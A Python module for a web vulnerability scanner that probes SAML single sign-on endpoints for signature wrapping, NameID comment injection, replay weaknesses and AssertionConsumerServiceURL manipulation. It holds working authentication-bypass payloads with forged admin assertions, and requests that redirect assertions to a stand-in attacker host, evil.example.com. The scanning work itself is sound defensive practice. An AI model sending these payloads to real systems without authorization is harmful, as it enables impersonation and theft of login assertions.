"""
SAML Tester — Detects SAML injection and bypass vulnerabilities.

Covers:
  - XML signature wrapping attacks
  - Comment injection in NameID
  - SAML response replay detection
  - Assertion consumer service manipulation
"""
import logging
import re

from apps.scanning.engine.testers.base_tester import BaseTester

logger = logging.getLogger(__name__)

# ── SAML endpoint indicators ────────────────────────────────────────────────
SAML_ENDPOINT_PATTERNS = [
    r'/saml/sso',
    r'/saml2/sso',
    r'/saml/acs',
    r'/saml2/acs',
    r'/adfs/ls',
    r'/simplesaml/',
    r'/saml/login',
    r'/sso/saml',
    r'/auth/saml',
    r'/mellon/',
    r'/Shibboleth\.sso/',
    r'/saml/metadata',
    r'/saml2/metadata',
    r'/FederationMetadata/',
]

SAML_BODY_RE = re.compile(
    r'(?:SAMLRequest|SAMLResponse|saml2?:|urn:oasis:names:tc:SAML'
    r'|AssertionConsumerServiceURL|samlp:)',
    re.IGNORECASE,
)

# ── XSW (XML Signature Wrapping) test payloads ──────────────────────────────
XSW_PAYLOAD_TEMPLATE = (
    '<?xml version="1.0"?>'
    '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
    '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_orig">'
    '<saml:Subject><saml:NameID>admin@evil.com</saml:NameID></saml:Subject>'
    '</saml:Assertion>'
    '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_forged">'
    '<saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>'
    '</saml:Assertion>'
    '</samlp:Response>'
)

# ── Comment injection payload ────────────────────────────────────────────────
COMMENT_INJECTION_NAMEID = 'admin@target.com<!---->.evil.com'

# ── ACS manipulation payloads ────────────────────────────────────────────────
ACS_EVIL_URLS = [
    'https://evil.example.com/acs',
    'https://evil.example.com/saml/acs',
    'https://target.com@evil.example.com/acs',
]


class SAMLTester(BaseTester):
    """Test for SAML injection and bypass vulnerabilities."""

    TESTER_NAME = 'SAML Injection'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulns = []
        url = getattr(page, 'url', '')
        body = getattr(page, 'body', '') or ''
        params = getattr(page, 'parameters', {}) or {}
        headers = getattr(page, 'headers', {}) or {}

        is_saml = self._is_saml_endpoint(url, body)
        if not is_saml:
            return vulns

        # 1. Check for SAML metadata exposure
        vuln = self._check_metadata_exposure(url)
        if vuln:
            vulns.append(vuln)

        # 2. Check for XML signature wrapping
        vuln = self._check_signature_wrapping(url, body, params)
        if vuln:
            vulns.append(vuln)

        if depth == 'shallow':
            return vulns

        # 3. Check for comment injection
        vuln = self._check_comment_injection(url, body, params)
        if vuln:
            vulns.append(vuln)

        # 4. Check for SAML response replay indicators
        vuln = self._check_replay_indicators(url, body, headers)
        if vuln:
            vulns.append(vuln)

        if depth in ('medium', 'deep'):
            # 5. Check ACS manipulation
            vuln = self._check_acs_manipulation(url, params)
            if vuln:
                vulns.append(vuln)

        return vulns

    # ── Detection helpers ────────────────────────────────────────────────────

    def _is_saml_endpoint(self, url: str, body: str) -> bool:
        for pattern in SAML_ENDPOINT_PATTERNS:
            if re.search(pattern, url, re.IGNORECASE):
                return True
        if SAML_BODY_RE.search(body):
            return True
        return False

    # ── Vulnerability checks ─────────────────────────────────────────────────

    def _check_metadata_exposure(self, url: str):
        """Check if SAML metadata is publicly accessible."""
        metadata_paths = ['/saml/metadata', '/saml2/metadata',
                          '/FederationMetadata/2007-06/FederationMetadata.xml']
        from urllib.parse import urljoin
        for path in metadata_paths:
            try:
                test_url = urljoin(url, path)
                resp = self._make_request('GET', test_url)
                if resp and resp.status_code == 200:
                    body = getattr(resp, 'text', '')
                    if 'EntityDescriptor' in body or 'IDPSSODescriptor' in body:
                        return self._build_vuln(
                            name='SAML Metadata Exposure',
                            severity='low',
                            category='Information Disclosure',
                            description=(
                                'SAML metadata is publicly accessible, exposing '
                                'certificates, endpoints, and identity provider details.'
                            ),
                            impact='Information disclosure of SSO infrastructure details',
                            remediation=(
                                'Restrict metadata endpoint access via authentication '
                                'or IP whitelisting.'
                            ),
                            cwe='CWE-200',
                            cvss=3.7,
                            affected_url=test_url,
                            evidence='SAML metadata with EntityDescriptor found',
                        )
            except Exception:
                continue
        return None

    def _check_signature_wrapping(self, url: str, body: str, params: dict):
        """Test for XML Signature Wrapping (XSW) attacks."""
        # Look for SAMLResponse parameter to test against
        saml_response = params.get('SAMLResponse', '')
        if not saml_response and 'SAMLResponse' not in body:
            # Try posting the XSW payload to the ACS endpoint
            try:
                resp = self._make_request('POST', url, data={
                    'SAMLResponse': XSW_PAYLOAD_TEMPLATE,
                })
                if resp and resp.status_code in (200, 302):
                    resp_body = getattr(resp, 'text', '')
                    # If the server processes it without rejecting signature
                    if ('error' not in resp_body.lower()
                            and 'invalid' not in resp_body.lower()
                            and 'signature' not in resp_body.lower()):
                        return self._build_vuln(
                            name='SAML XML Signature Wrapping',
                            severity='critical',
                            category='Authentication',
                            description=(
                                'The SAML service provider may be vulnerable to '
                                'XML Signature Wrapping (XSW) attacks, allowing '
                                'an attacker to modify SAML assertions while keeping '
                                'the signature valid.'
                            ),
                            impact='Authentication bypass, identity spoofing',
                            remediation=(
                                'Validate XML signatures strictly. Use a SAML library '
                                'that is not vulnerable to XSW. Verify the signed '
                                'element is the one being processed.'
                            ),
                            cwe='CWE-347',
                            cvss=9.8,
                            affected_url=url,
                            evidence='Server processed unsigned SAML assertion without error',
                        )
            except Exception:
                pass
        return None

    def _check_comment_injection(self, url: str, body: str, params: dict):
        """Test for SAML NameID comment injection."""
        try:
            resp = self._make_request('POST', url, data={
                'SAMLResponse': (
                    '<?xml version="1.0"?>'
                    '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
                    '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
                    f'<saml:Subject><saml:NameID>{COMMENT_INJECTION_NAMEID}'
                    '</saml:NameID></saml:Subject>'
                    '</saml:Assertion></samlp:Response>'
                ),
            })
            if resp and resp.status_code in (200, 302):
                resp_body = getattr(resp, 'text', '')
                if 'admin' in resp_body.lower() and 'error' not in resp_body.lower():
                    return self._build_vuln(
                        name='SAML Comment Injection',
                        severity='critical',
                        category='Authentication',
                        description=(
                            'The SAML processor may truncate NameID at XML comments, '
                            'allowing an attacker to impersonate other users by '
                            'injecting comments into the NameID field.'
                        ),
                        impact='Authentication bypass, user impersonation',
                        remediation='Canonicalize XML before extracting NameID. Reject comments in assertions.',
                        cwe='CWE-91',
                        cvss=9.8,
                        affected_url=url,
                        evidence=f'Comment injection payload: {COMMENT_INJECTION_NAMEID}',
                    )
        except Exception:
            pass
        return None

    def _check_replay_indicators(self, url: str, body: str, headers: dict):
        """Check for indicators that SAML responses can be replayed."""
        # Look for missing InResponseTo or Conditions/NotOnOrAfter
        if 'SAMLResponse' in body or 'saml:Assertion' in body:
            has_not_on_or_after = 'NotOnOrAfter' in body
            has_in_response_to = 'InResponseTo' in body

            if not has_not_on_or_after and not has_in_response_to:
                return self._build_vuln(
                    name='SAML Replay Vulnerability',
                    severity='high',
                    category='Authentication',
                    description=(
                        'SAML response lacks NotOnOrAfter and InResponseTo attributes, '
                        'indicating the assertion may be replayable.'
                    ),
                    impact='Session replay attacks, persistent unauthorized access',
                    remediation=(
                        'Enforce NotOnOrAfter for time-based validity. '
                        'Require InResponseTo to bind assertions to specific requests. '
                        'Track processed assertion IDs to prevent replay.'
                    ),
                    cwe='CWE-294',
                    cvss=7.5,
                    affected_url=url,
                    evidence='SAML assertion missing NotOnOrAfter and InResponseTo',
                )
        return None

    def _check_acs_manipulation(self, url: str, params: dict):
        """Check if AssertionConsumerServiceURL can be manipulated."""

        for evil_acs in ACS_EVIL_URLS:
            try:
                resp = self._make_request('POST', url, data={
                    'SAMLRequest': '<samlp:AuthnRequest '
                        'AssertionConsumerServiceURL="' + evil_acs + '" '
                        'xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"/>',
                })
                if resp and resp.status_code in (200, 302):
                    location = resp.headers.get('Location', '')
                    if 'evil.example.com' in location:
                        return self._build_vuln(
                            name='SAML ACS Manipulation',
                            severity='high',
                            category='Authentication',
                            description=(
                                'The identity provider accepts a manipulated '
                                'AssertionConsumerServiceURL, allowing the attacker '
                                'to redirect SAML responses to an evil endpoint.'
                            ),
                            impact='SAML assertion theft via redirect manipulation',
                            remediation=(
                                'Strictly validate AssertionConsumerServiceURL against '
                                'pre-registered SP metadata. Reject unknown URLs.'
                            ),
                            cwe='CWE-601',
                            cvss=8.0,
                            affected_url=url,
                            evidence=f'ACS redirected to: {evil_acs}',
                        )
            except Exception:
                continue
        return None
